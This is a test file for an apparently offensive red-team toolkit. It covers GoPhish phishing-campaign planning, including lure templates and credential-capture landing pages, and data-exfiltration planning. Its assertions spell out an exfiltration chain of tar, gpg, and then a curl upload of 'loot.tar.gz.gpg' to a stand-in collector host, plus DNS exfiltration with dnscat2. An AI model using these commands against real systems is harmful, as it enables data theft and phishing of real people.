"""Tests for phishing (GoPhish planning) and exfiltration planners."""

from valen.redteam.exfil import exfil_plan, upload_command
from valen.redteam.phishing import (
    api_command,
    campaign_plan,
    campaign_payload,
    group_payload,
    page_payload,
    parse_results,
    template_payload,
)


def test_phishing_payloads():
    g = group_payload("t", [{"email": "a@corp", "first_name": "A"}])
    assert g["targets"][0]["email"] == "a@corp"
    assert template_payload("t", "s", "<b>")["subject"] == "s"
    assert page_payload("p", "<form>", redirect_url="http://x")["redirect_url"] == "http://x"
    assert campaign_payload("c", "t", "p", "g")["groups"][0]["name"] == "g"


def test_campaign_plan_and_calls():
    plan = campaign_plan("http://gp:3333", "KEY", name="q3",
                         senders=[{"email": "a@corp"}], subject="Hi",
                         body_html="<b>", landing_html="<form>",
                         landing_url="http://lure")
    assert set(plan) >= {"group", "template", "page", "campaign", "calls"}
    assert len(plan["calls"]) == 4
    assert plan["calls"][0][:2] == ["curl", "-sS"]
    assert any("/api/groups/" in x for x in plan["calls"][0])
    assert api_command("http://gp", "K", "campaigns", {})[0] == "curl"


def test_parse_results_funnel():
    m = parse_results({"stats": {"sent": 10, "opened": 6, "clicked": 3,
                                 "submitted_data": 2, "email_reported": 1}})
    assert m["sent"] == 10 and m["click_rate"] == 0.3 and m["submit_rate"] == 0.2
    assert parse_results({})["sent"] == 0


def test_exfil_plan():
    plan = exfil_plan(["secrets.txt"], "https://collector/up", passphrase="pw", chunk=True)
    assert plan["stage"][:3] == ["tar", "czf", "loot.tar.gz"]
    assert plan["encrypt"][0] == "gpg"
    assert plan["upload"] == ["curl", "-sS", "--upload-file", "loot.tar.gz.gpg",
                              "https://collector/up"]
    assert "chunk" in plan
    assert upload_command("a", "d", "dns")[0] == "dnscat2"


def test_delivery_endpoints():
    from valen.server import _exfil_plan, _phishing_plan

    assert "calls" in _phishing_plan({"base_url": "http://gp", "senders": []})
    assert "upload" in _exfil_plan({"dest": "https://c/up"})
    assert "error" in _phishing_plan({})
    assert "error" in _exfil_plan({})
